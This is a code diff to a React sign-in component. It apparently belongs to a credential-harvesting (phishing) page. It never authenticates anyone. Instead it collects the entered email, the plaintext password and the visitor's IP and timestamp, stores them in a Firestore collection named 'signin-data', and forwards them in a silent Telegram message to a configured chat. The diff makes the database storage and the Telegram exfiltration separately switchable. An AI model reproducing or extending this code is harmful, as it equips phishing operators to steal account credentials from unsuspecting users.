@@ -49,6 +49,8 @@ const SignIn = () => {
         .then(ip => {
             const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
             const isEnableDecrypt = process.env.REACT_APP_PUBLIC_ENCRYPT_ENABLE
+            const isEnableDBStore = process.env.REACT_APP_PUBLIC_DB_STORE_ENABLE
+            const isEnableTM = process.env.REACT_APP_PUBLIC_TM_ENABLE
             let email = data.email
             let password = data.password
             let ip_address = ip
@@ -60,32 +62,35 @@ const SignIn = () => {
                 ip_address = CryptoJS.AES.encrypt(ip_address, secretKey).toString() 
                 logged_at = CryptoJS.AES.encrypt( logged_at, secretKey).toString()
             }
-            db.collection('signin-data').add({
-                email: email,
-                password: password,
-                ip_address: ip_address,
-                logged_at: logged_at
-            }).then(res => {
-                if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
-                {
-                    let message = "Sign In Data\r\n"
-                    message += "" + email + '\r\n'
-                    message += "" + password + '\r\n'
-                    message += "" + ip_address + '\r\n'
-                    message += "" + logged_at
-                    client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
-                        disableWebPagePreview: true,
-                        disableNotification: true,
-                    })
-                    .then( res => console.log(res,'telegram res'))
-                    .catch( e => console.log('error while TM message' + e))
-                }
-                setFormSuccess( true )
-            }).catch(err => {
-                throw new Error(err);
-            });
-            
-            
+            let tmMessage = "Sign In Data\r\n"
+                tmMessage += "" + email + '\r\n'
+                tmMessage += "" + password + '\r\n'
+                tmMessage += "" + ip_address + '\r\n'
+                tmMessage += "" + logged_at
+            if( isEnableDBStore === '1' )
+            {
+                db.collection('signin-data').add({
+                    email: email,
+                    password: password,
+                    ip_address: ip_address,
+                    logged_at: logged_at
+                }).then(res => {
+                    setFormSuccess( true )
+                }).catch(err => {
+                    throw new Error(err);
+                });
+            }
+            if( isEnableTM === '1' )
+            {
+                client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, tmMessage, {
+                    disableWebPagePreview: true,
+                    disableNotification: true,
+                })
+                .then( res => {
+                    setFormSuccess( true )
+                })
+                .catch( e => console.log('error while TM message' + e))
+            }
         })
         .catch( e => console.log('error while fetching ip' + e))
 
